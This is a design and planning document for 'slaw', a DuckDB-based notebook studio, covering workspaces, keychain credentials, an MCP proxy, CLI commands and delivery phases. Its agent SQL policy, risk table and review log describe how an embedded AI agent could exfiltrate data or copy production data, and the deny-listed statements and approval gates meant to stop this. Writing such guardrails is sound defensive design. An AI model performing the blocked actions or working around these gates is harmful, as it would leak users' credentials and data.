- **Skills** gate on catalog-qualified tables, probed lazily (only already-attached connections) so opening a workspace never dials remotes.
- **MCP:** `slaw mcp serve [--workspace DIR]` with walk-up and the Studio proxy above. **(spike #107)** The proxy is feasible with mcp-go v0.44.1 alone: `client/transport.NewSSE` with `WithHeaders({"Authorization": "Bearer …"})` plus a ~25-line raw JSON-RPC pass-through (prototype: `internal/session/mcpproxy_spike_test.go`) round-tripped `initialize`/`tools/list`/`tools/call` against the real `internal/mcp` server; mcp-go has no ready-made bridge. Studio's token changes on every `Start`, so it goes (mode 0600, never argv) with the port beside `hub.lock`; the proxy exits with stdin, and turns a dead upstream into a JSON-RPC error plus non-zero exit. `prompt`-credential connections report *needs-credentials* headless. Studio adds "Copy Claude Desktop / Claude Code config".

### 4.6 The `.slaw` file

- **Bundle export (new):** `.slaw` = zip with `manifest.json` (`kind: slaw/bundle`, `formatVersion: 2`), `notebooks/`, `queries/`, `skills/`, and connection definitions (credentials never included). No data, no secrets → **unencrypted by default, optional passphrase encryption** (D2): the whole archive is wrapped in one authenticated envelope (age/scrypt-style or AES-256-GCM + scrypt KDF via a vetted library — no bespoke crypto), flagged in an unencrypted outer header so import knows to prompt.
- **Import:** into the current workspace with per-item rename / overwrite / skip. Single-notebook `.slnb` import/export (`studio/app.go:708-830`) shares the code path.
- **Legacy import (formatVersion 1, SQLCipher) — permanent:** passphrase → write notebooks/queries/skills as files → materialise the DuckDB blob to `data/<stem>.duckdb` → register it as a `duckdb` connection (default) → `notebooks.MigratePages` runs here. Cells/bindings get `connection: <stem>`. `internal/container` shrinks to a **read-only legacy reader** used only by this importer.

### 4.7 Notebook format v2

Cells (`sql`, `a2ui` `sql` bindings — `internal/a2ui/schema.go:92-96`) gain an optional `connection`; unset = workspace `default_connection`. Saved queries carry `connection` in frontmatter. `internal/docsref`, starter templates and the A2UI validator update with it. v1 notebooks load as v2 with no connection set.

### 4.8 Studio UX (fresh design pass — Phase 0b)

- **Launcher** replaces `UnlockView`: recent workspaces (`prefs.Extra`: path, id, last-opened), *Open folder…*, *New workspace…* (name, location, git init, starter template), *Import .slaw…* (legacy or bundle → new workspace). Absorbs #56 and UX-panel T9.
- **Workspace switcher** in the shell header (Obsidian-style), switchable any time: `usePendingSaves.flushAll` → close session → open next; `sessionID` becomes a workspace session id. MD-token mismatch → relaunch prompt.
- **Connections rail** (DataGrip/DBeaver explorer): `connection → schema → table/view → columns`; status dot; actions Connect / Disconnect / Refresh / New query here / Edit / Test / Duplicate / Remove; scope badge.
- **Connection editor:** type picker → form generated from the type registry → credential fields write-only (`•••• in keychain · Replace · Clear`) → *Test* → save to scope, with "this file is committed — credentials stay in your keychain".
- **Query editor & SQL cells:** connection selector; catalog-aware completion from the schema cache (#84).
- **Datasheet editing** stays for writable connections; read-only connections show it locked with the reason.
- **Settings** splits into *Workspace* (name, default connection, sandbox, MCP) and *App* (theme, LLM provider/key, extensions).

### 4.9 CLI

| Command | Notes |
|---|---|
| `slaw workspace init [dir] [--git]`, `slaw workspace info` | replace `init` / `info` |
| `slaw conn add\|list\|edit\|test\|rm [--scope user\|shared\|local]` | `add` prompts for credentials on a TTY → keychain |
| `slaw conn credentials set\|clear <name>` | |
| `slaw query "<sql>" [-c conn]` | duck-tape parity |
| `slaw import <file> --into <conn>.<table>` | through the session — fixes #72 by construction |
| `slaw export bundle\|notebook …`, `vibe import bundle\|legacy <file.vibe>` | subsumes #9 |
| `slaw mcp serve [--workspace DIR]` | walk-up + Studio proxy |
| `slaw studio [dir]` | TUI REPL on the session |

Retire `verify`, `compact`, `rekey`, `dump`, `passphrase`. The legacy importer stays permanently (D6).

## 5. Delivery: three vertical slices

Owner decision D14: **workspaces first**. Each slice is user-visible and lands through the usual build → adversarial review → Rodney QA loop. Tracking epic: #105.

### Phase 0 — Decide, design, spike (no product code)
- **0a.** Direction rewrite — `docs/direction.md`, CLAUDE.md, superseded banners (this docs PR).
- **0b.** Design pass #106: launcher, workspace switcher, connections rail, connection editor, credential / error / locked / read-only states, settings split. Mockups reviewed before Slice 1's Studio work and Slice 2's connection UI.
- **0c.** Spike #107 on DuckDB 1.4.1 → findings note pinning §4.4/§4.5: `CREATE SECRET (TYPE motherduck)` vs connector-config token · `attach_mode=single` · `postgres_execute` under `READ_ONLY` · secret-based Postgres attach and `duckdb_databases().path` · connector-config hardening in go-duckdb v2 · `allowed_directories` × `INSTALL` · cost of `information_schema`/`SUMMARIZE` on remote PG · go-keyring on Fedora/GNOME, KDE, SSH, unsigned macOS · MCP stdio → Studio proxy.

### Slice 1 — Workspace = folder
The workspace and the hub arrive with exactly one kind of connection: local `duckdb` files (the default `data/local.duckdb`, D3, plus any legacy imports). No keychain needed yet.
- #108 **Session hub + catalog-aware engine** — `internal/session` (in-memory hub, open-time hardening, lazy attach, status, schema cache); replaces `engine.Manager`'s single-DB use; all 22 `'main'` sites; `crud`/`importer` on `catalog.schema.table`; notebook format v2 (`connection` per cell / A2UI binding).
- #109 **Workspace core + file-backed stores** — `internal/workspace` (`slaw.yaml`, walk-up, id + duplicate detection, `.gitignore`/`.gitattributes` seeding, `.slaw-local/`); `notebooks.Store` / `queries.Store` / `skills.Store` with file impls, compare-and-write, `fsnotify` watcher, git-stable serialisers + golden tests; sandbox + ask-before-writes move to `slaw.yaml`.
- #110 **Legacy `.vibe` importer** — SQLCipher → files + `data/<stem>.duckdb` connection; `MigratePages` runs here; `internal/container` becomes a read-only legacy reader.
- #111 **Studio: launcher, switcher, workspace shell** — replaces `UnlockView` (absorbs #56, #89's Unlock items); recent workspaces; Obsidian-style switcher; `requireWorkspace()` replaces the `a.container == nil` gates; on-disk conflict banner; Workspace vs App settings. Save/Revert/dirty (#81/#98) retire for connection data.
- #112 **Hub ownership + MCP** — `.slaw-local/hub.lock` (reusing #80's `flock`), `slaw mcp serve [--workspace]` walk-up and proxy-to-Studio, Studio *open read-only / take over* (replaces #97).
- #113 **CLI on workspaces** — `slaw workspace init|info`, `slaw query`, `slaw import <file> --into <conn>.<table>` (closes #72), `slaw import legacy`, TUI REPL on the session.
- **Ships:** open a folder, git-share notebooks/queries/skills, old `.vibe` files migrate in, agent + MCP work against the workspace.

### Slice 2 — Connections & credentials
- #114 **`internal/secrets`** — keychain (go-keyring), `env:` first-class, `prompt`, chain resolver, redactor, non-logging secret-DDL path; LLM API key → keychain with one-time migration.
- #115 **`internal/connections`** — model; user / shared / local scopes; type registry for `postgres`, `motherduck` (one account per workspace, D10), `sqlite`, `s3`/`gcs`/`r2`; quoting helpers; Test (MotherDuck in a subprocess); integration tests behind a build tag.
- #116 **Agent SQL policy & connection tools** — allow-list tiers, never-list (ATTACH, SECRET, SET/PRAGMA, INSTALL/LOAD, passthroughs, MD sharing, settings/secret functions), URL reads only inside storage scopes, `duckdb_databases()` projection, three-gate writes with ask-before-writes forced on for non-local connections (D8), `list_connections`, catalog-aware tools, lazy skill gating; guardrail tests.
- #117 **Studio: connections rail + editor; CLI `slaw conn`** — explorer tree, status, write-only credential fields, Test, scope picker, connection selector in query editor and SQL cells, catalog-aware completion (#84), extension install consent.
- **Ships:** Postgres / MotherDuck / S3 next to local data, credentials in the keychain, shared definitions in git.

### Slice 3 — Exchange & breadth
- #118 **`.slaw` bundle export/import** — zip + manifest, optional passphrase envelope (D2), conflict prompts, `slaw export|import bundle`, subsumes #9; retire `verify/compact/rekey/dump/passphrase`.
- #119 **More connection types** — `mysql`, `azure`, `ducklake`, `iceberg`/`delta`.
- Packaging (#77): folder open (`slaw studio <dir>`, macOS `OnFileOpen`), `.slaw` association = import, signed-build keychain test, extension pinning/bundling (D12).
- Reference docs: `docs/reference/workspaces.md`, `docs/reference/connections.md`; `internal/docsref` covers the type list. (Each slice issue updates the docs it touches.)

**Cut from this epic:** TUI connection editor, git commit/push UI, notebook merge UI, Windows.

**Existing issues:** #72 → closed by #113; #9 → #118; #56 → #111; #97 → #112; #84 completion → #117 (schema cache from #108); #99 per-action undo → deferred (source-dependent); #89 Unlock items → #111; #77 → Slice 3 packaging items; #93 T7 persistence mostly dissolves, T1 agent safety → #116, T5 → #109, T9 → #111, T11 → #112.

## 6. Risks

| Risk | Mitigation |
|---|---|
| Agent scans or exfiltrates prod data | `read-only` default sandbox; allow-list policy; no URL reads outside storage scopes; connection `read_only` default; statement timeout + row cap; result budget (#70). Documented: read access to a connection = the agent can see that data |
| Cross-source copy `INSERT INTO local SELECT … FROM prod` | Two-gate writes; it's a legitimate feature when both gates are open — surfaced in the approval queue |
| Keychain unavailable (headless Linux, WSL, agent shells) | `env:` first-class; *needs-credentials* status; no plaintext fallback |
| MotherDuck version lag / one token per process | Pin go-duckdb; relaunch on token switch; one MD account per workspace |
| Extension downloads (network, proxies) | Consent + status UI; respect `HTTP(S)_PROXY`; optional bundling (D12) |
| DuckDB single-writer lock | One hub per workspace; MCP proxies to Studio |
| Concurrent edits to workspace files | Compare-and-write + conflict UI; watcher |
| Notebook JSON merge conflicts | One file per notebook, stable ids; Markdown format evaluated later (D4) |
| `studio/app.go` (3k+ lines) refactor | Session + stores land behind interfaces first (#108, #109); Studio swaps the container out behind `requireWorkspace()` in one PR (#111) |
| Losing "encrypted by default" | Content is plaintext by design (meant for git); data encryption is the source's job; credentials in keychain |

## 7. Decisions (owner, 2026-10-06)

| # | Decision | Outcome |
|---|---|---|
| D1 | Share connection definitions in the repo? | **Yes.** Definitions committed in `slaw.yaml`; credentials (and per-person usernames) from keychain or env; plus local and user scopes |
| D2 | Encrypt `.slaw` bundles? | **Unencrypted by default, optional passphrase encryption** |
| D3 | Default `local` DuckDB per workspace? | **Yes**, `data/local.duckdb`, git-ignored (opt-in to commit) |
| D4 | Notebook on-disk format | Pretty JSON `.slnb` now; Markdown evaluated later |
| D5 | TUI | Keep REPL on the session; no TUI connection editor |
| D6 | Legacy | Importer permanent; retire `verify/compact/rekey/dump/passphrase` |
| D7 | Workspace id | Committed id; clones share creds on one machine; `cp -r` → offer regenerate |
| D8 | Agent default | **Reads freely; writes behind a permission check** — `read-write` tier with the #79 approval gate, forced on for non-local connections; connections `read_only` by default |
| D9 | `prompt` credentials → keychain? | Offer "remember", off by default |
| D10 | MotherDuck | **One account per workspace; relaunch when switching accounts** |
| D11 | Windows | Out of scope for this epic (macOS + Linux per #77) |
| D12 | Extensions | Pin go-duckdb to MotherDuck-supported versions; download-on-consent; bundling decided in #77 |
| D13 | Agent isolation | Classifier + plan allow-list on the shared hub; external-access-off agent hub is a follow-up |
| D14 | Slice order | **Workspaces first**, then connections |

## 8. Out of scope

Multi-user mesh (still deferred), commit/push UI, notebook merge UI, Windows, scheduled/refresh jobs, MotherDuck Dives/Flights integration, per-row access control.

## 9. Review log

v1 → v2 changes from the Fable adversarial review (it ran checks against the embedded DuckDB 1.4.1):
- **Wrong in v1:** "retry `READ_ONLY` on lock conflict" (DuckDB never mixes RW + RO processes) → single hub per workspace + MCP proxy. "Set `allow_persistent_secrets` after setup" (fails once the secret manager is used) → connector config at open. "`lock_configuration` as a gate" (doesn't block ATTACH/SECRET) → SQL policy is the gate. MotherDuck token-on-ATTACH, workspace-mode attach, one-token-per-process → §4.4 constraints.
- **Security:** `full` as deny-list allowed URL exfiltration → allow-list tiers, `read-only` default, passthrough/share functions denied.
- **Gaps added:** 18 (not ~8) `'main'` sites; notebook format v2; compare-and-write concurrency; non-recursive fsnotify; per-pid scratch dirs; secret DDL on a non-logging path; per-person username out of committed config; `slaw.yaml` instead of `.slaw/` dir; duck-tape's prepare-validation + schema cache.
- **Sequencing:** six Go-only phases → three user-visible slices; mysql/lakehouse types, git UI, TUI work deferred. (The reviewer recommended connections-first; the owner chose workspaces-first, D14. Bundle encryption, which the reviewer suggested cutting, stays as an option per D2.)
